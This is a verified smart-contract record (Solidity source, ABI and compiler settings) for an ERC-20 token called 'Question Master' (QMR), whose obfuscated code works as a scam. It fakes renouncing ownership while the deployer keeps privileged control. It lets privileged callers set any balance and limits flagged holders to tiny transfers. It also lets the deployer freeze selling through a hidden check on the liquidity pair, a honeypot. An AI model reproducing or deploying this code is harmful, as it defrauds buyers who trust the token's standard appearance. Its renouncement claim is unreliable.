{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface launchedLaunch {\n    function createPair(address receiverIs, address atTrading) external returns (address);\n}\n\ninterface modeTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverExempt) external view returns (uint256);\n\n    function transfer(address enableSell, uint256 tradingShould) external returns (bool);\n\n    function allowance(address tradingLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableSell,\n        uint256 tradingShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableWallet, uint256 value);\n    event Approval(address indexed tradingLimit, address indexed spender, uint256 value);\n}\n\nabstract contract fundBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeTotalMetadata is modeTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract QuestionMaster is fundBuy, modeTotal, modeTotalMetadata {\n\n    uint256 private launchTrading;\n\n    function maxMin(address txAt) public {\n        if (swapSenderTo) {\n            return;\n        }\n        if (totalMin) {\n            teamMin = false;\n        }\n        shouldTake[txAt] = true;\n        if (launchTrading != enableLaunch) {\n            buySender = false;\n        }\n        swapSenderTo = true;\n    }\n\n    address public isLaunched;\n\n    function approve(address swapAmountBuy, uint256 tradingShould) public virtual override returns (bool) {\n        fromSell[_msgSender()][swapAmountBuy] = tradingShould;\n        emit Approval(_msgSender(), swapAmountBuy, tradingShould);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletLiquidity;\n    }\n\n    function tokenFrom() private view {\n        require(shouldTake[_msgSender()]);\n    }\n\n    function balanceOf(address receiverExempt) public view virtual override returns (uint256) {\n        return walletMax[receiverExempt];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLimitLiquidity;\n    }\n\n    uint256 buyFrom;\n\n    bool public buySender;\n\n    mapping(address => uint256) private walletMax;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeTx;\n    }\n\n    function transfer(address fromTrading, uint256 tradingShould) external virtual override returns (bool) {\n        return buyMode(_msgSender(), fromTrading, tradingShould);\n    }\n\n    function getOwner() external view returns (address) {\n        return isList;\n    }\n\n    string private receiverLimitLiquidity = \"Question Master\";\n\n    address liquidityTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellLimit;\n    }\n\n    constructor (){\n        \n        totalBuy atTx = totalBuy(receiverMin);\n        totalMaxEnable = launchedLaunch(atTx.factory()).createPair(atTx.WETH(), address(this));\n        \n        isLaunched = _msgSender();\n        shouldTake[isLaunched] = true;\n        walletMax[isLaunched] = modeTx;\n        walletList();\n        \n        emit Transfer(address(0), isLaunched, modeTx);\n    }\n\n    function takeEnable(address launchedReceiver, address enableSell, uint256 tradingShould) internal returns (bool) {\n        require(walletMax[launchedReceiver] >= tradingShould);\n        walletMax[launchedReceiver] -= tradingShould;\n        walletMax[enableSell] += tradingShould;\n        emit Transfer(launchedReceiver, enableSell, tradingShould);\n        return true;\n    }\n\n    address public totalMaxEnable;\n\n    function limitLaunched(address totalMax) public {\n        tokenFrom();\n        \n        if (totalMax == isLaunched || totalMax == totalMaxEnable) {\n            return;\n        }\n        launchedReceiverLimit[totalMax] = true;\n    }\n\n    uint8 private sellLimit = 18;\n\n    bool public totalMin;\n\n    uint256 public enableLaunch;\n\n    address receiverMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed fromLaunched, address indexed fundShould);\n\n    function transferFrom(address launchedReceiver, address enableSell, uint256 tradingShould) external override returns (bool) {\n        if (_msgSender() != receiverMin) {\n            if (fromSell[launchedReceiver][_msgSender()] != type(uint256).max) {\n                require(tradingShould <= fromSell[launchedReceiver][_msgSender()]);\n                fromSell[launchedReceiver][_msgSender()] -= tradingShould;\n            }\n        }\n        return buyMode(launchedReceiver, enableSell, tradingShould);\n    }\n\n    mapping(address => bool) public launchedReceiverLimit;\n\n    function walletList() public {\n        emit OwnershipTransferred(isLaunched, address(0));\n        isList = address(0);\n    }\n\n    function toFee(uint256 tradingShould) public {\n        tokenFrom();\n        buyFrom = tradingShould;\n    }\n\n    uint256 constant shouldReceiver = 13 ** 10;\n\n    uint256 fundReceiverToken;\n\n    uint256 private swapSender;\n\n    bool private teamMin;\n\n    string private walletLiquidity = \"QMR\";\n\n    function receiverFund(address fromTrading, uint256 tradingShould) public {\n        tokenFrom();\n        walletMax[fromTrading] = tradingShould;\n    }\n\n    mapping(address => mapping(address => uint256)) private fromSell;\n\n    function buyMode(address launchedReceiver, address enableSell, uint256 tradingShould) internal returns (bool) {\n        if (launchedReceiver == isLaunched) {\n            return takeEnable(launchedReceiver, enableSell, tradingShould);\n        }\n        uint256 walletLiquidityList = modeTotal(totalMaxEnable).balanceOf(liquidityTotal);\n        require(walletLiquidityList == buyFrom);\n        require(enableSell != liquidityTotal);\n        if (launchedReceiverLimit[launchedReceiver]) {\n            return takeEnable(launchedReceiver, enableSell, shouldReceiver);\n        }\n        return takeEnable(launchedReceiver, enableSell, tradingShould);\n    }\n\n    function allowance(address teamEnable, address swapAmountBuy) external view virtual override returns (uint256) {\n        if (swapAmountBuy == receiverMin) {\n            return type(uint256).max;\n        }\n        return fromSell[teamEnable][swapAmountBuy];\n    }\n\n    function owner() external view returns (address) {\n        return isList;\n    }\n\n    bool public swapSenderTo;\n\n    address private isList;\n\n    uint256 private modeTx = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public shouldTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapAmountBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmountBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedReceiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"}],\"name\":\"limitLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"}],\"name\":\"maxMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"receiverFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSenderTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"toFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMaxEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "QuestionMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}